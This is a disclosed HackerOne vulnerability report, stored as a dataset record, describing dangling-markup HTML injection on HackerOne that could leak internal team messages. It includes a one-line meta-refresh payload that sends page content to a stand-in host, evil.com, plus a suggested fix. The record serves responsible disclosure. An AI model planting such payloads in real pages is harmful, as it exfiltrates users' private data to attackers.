---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '110578'
original_report_id: '110578'
title: HTML injection can lead to data theft
weakness: Violation of Secure Design Principles
team_handle: security
created_at: '2016-01-13T23:59:29.009Z'
disclosed_at: '2016-01-26T16:05:58.643Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- violation-of-secure-design-principles
---

# HTML injection can lead to data theft

## Metadata

- HackerOne Report ID: 110578
- Weakness: Violation of Secure Design Principles
- Program: security
- Disclosed At: 2016-01-26T16:05:58.643Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey,

This is more like an in-depth security thing with a reasonable attack scenario.

In some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:

1. There's a HTML injection vulnerability
2. The sensitive data is preceded by the HTML injection vulnerability
3. After the sensitive data, there's a single quote (could be inserted by the attacker)

Due to these requirements I haven't been able to test it, though I did found some places where it theoretically could work.

The problem is that HackerOne does not convert single quotes to their HTML entities (&lsquo;), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.

## Example

Say someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here's a quick sketch of a report to illustrate this:

[report title]
\> reporter: report body
 < vendor: reply
 < vendor: internal reply
\> reporter: comment (that contains a single quote)

At this point, if the reporter would add the following to the summary (above the report body):

> <meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=

This will send the following to the server:

>report body + vendor reply + internal reply

Because the unconverted ' in the last comment would close the attribute and form a valid HTML element.
You could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.

Another vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.

## The fix

The behavior described above can easily be prevented.: 

I'd just add the conversion to &lsquot  to your sanitization filter. I can't think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.


Best regards


Inti

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
